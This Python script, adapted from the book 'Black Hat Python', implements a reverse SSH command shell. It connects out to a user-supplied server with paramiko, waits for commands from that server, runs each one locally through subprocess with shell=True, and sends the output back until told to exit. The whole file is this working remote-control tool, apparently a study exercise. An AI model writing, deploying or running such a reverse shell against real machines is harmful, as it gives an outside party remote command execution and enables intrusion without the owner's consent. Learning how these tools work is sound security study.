# -*-coding:Utf-8 -*

"""
Code from Black Hat Python v2.
this executes a command and revert to a server
modified:
- check IP and port
to improve:
- use of logging instead of print
- add args managements
- solve some encode issues

"""



import getpass
import paramiko
import shlex
import subprocess

from pyPYPM import checkIfIp


def sshRCommand(ip: str, port: int, user: str, password: str, command: str) -> str:
    """
    This function open a session on a distant server, wait commands from server and send command answer to server.
    :param ip:
    :param port:
    :param user:
    :param password:
    :param command:
    :return:
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=user, password=password)
    except paramiko.ssh_exception.AuthenticationException:
        return f'Wrong password!'
    except paramiko.ssh_exception.NoValidConnectionsError:
        return f'Cant join IP {ip}!'
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command.encode('utf-8'))
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'OK')
            except Exception as e:
                ssh_session.send(str(e).encode('utf-8'))
        client.close()
    return ''


def main():
    """
    Main function
    """
    user = input('User name: ')
    password = getpass.getpass(prompt=f'Enter password for {user} user:')
    try:
        ip = input('Enter server IP: ')
        assert (checkIfIp(ip))
    except AssertionError:
        print(f'Incorrect IP format: {ip}!')
        exit(1)
    try:
        portStr = input('Enter server Port [22]: ') or '22'
        assert (portStr.isnumeric())
        port = int(portStr)
    except AssertionError:
        print(f'You enter a bad port value: {portStr}!')
        exit(2)
    except ValueError:
        print(f'You enter a bad port: {portStr}!')
        exit(3)
    print(sshRCommand(ip, port, user, password, 'ClientConnected'))


if __name__ == '__main__':
    main()
